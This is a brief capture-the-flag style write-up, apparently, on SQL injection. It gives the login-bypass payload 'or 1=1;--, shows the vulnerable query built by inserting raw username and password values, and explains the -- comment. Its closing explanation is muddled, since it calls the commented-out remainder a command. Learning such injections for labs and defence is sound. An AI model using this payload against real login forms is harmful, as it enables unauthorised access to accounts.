# SQLI
## writeup

easy sql injection inject this

```
'or 1=1;--
```

the query looks like this

```
SELECT * FROM users WHERE username = '${username}' AND password = ''or 1=1;--'
```

note: 
```
the -- represent a comment in sql so the rest of the code will be like a command
```